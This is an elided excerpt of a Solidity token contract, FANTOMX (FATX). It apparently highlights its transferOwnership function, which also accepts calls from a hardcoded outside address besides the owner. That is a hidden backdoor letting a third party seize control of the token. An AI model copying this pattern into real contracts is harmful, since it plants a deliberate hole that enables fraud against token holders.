...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xDE8c2fb2e287cf54892a9f62aAff6Fe1005Fd0E9));
...
contract FANTOMX is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "FATX";
  string private _name = "FANTOMX";
